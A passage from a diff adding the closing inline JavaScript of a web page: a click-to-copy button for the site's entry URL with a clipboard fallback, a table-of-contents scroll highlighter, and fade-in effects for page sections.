+    var done=function(){btn.innerText='已复制站点入口 ✓';setTimeout(function(){btn.innerText=back;},2000);};
+    if(navigator.clipboard&&window.isSecureContext){navigator.clipboard.writeText(url).then(done,fb);}else fb();
+    function fb(){var t=document.createElement('textarea');t.value=url;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();try{document.execCommand('copy');done();}catch(e){}document.body.removeChild(t);}
+  });
+  var links=document.querySelectorAll('.toc a');
+  var items=[];
+  links.forEach(function(a){
+    var id=a.getAttribute('href').slice(1);
+    var el=document.getElementById(id);
+    if(el)items.push({el:el,a:a});
+  });
+  function spy(){
+    var y=window.scrollY+120,cur=null;
+    items.forEach(function(o){if(o.el.offsetTop<=y)cur=o.a;});
+    links.forEach(function(a){a.classList.remove('on');});
+    if(cur)cur.classList.add('on');
+  }
+  window.addEventListener('scroll',spy,{passive:true});spy();
+  if('IntersectionObserver' in window){
+    var els=document.querySelectorAll('.lede,.note,.cell,.essay,.quote,.route,.terms,.ent,.head,.toc');
+    els.forEach(function(el){el.classList.add('rev');});
+    var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}});},{threshold:.06});
+    els.forEach(function(el){io.observe(el);});
+  }
+})();
+</script>
+</body>
+</html>
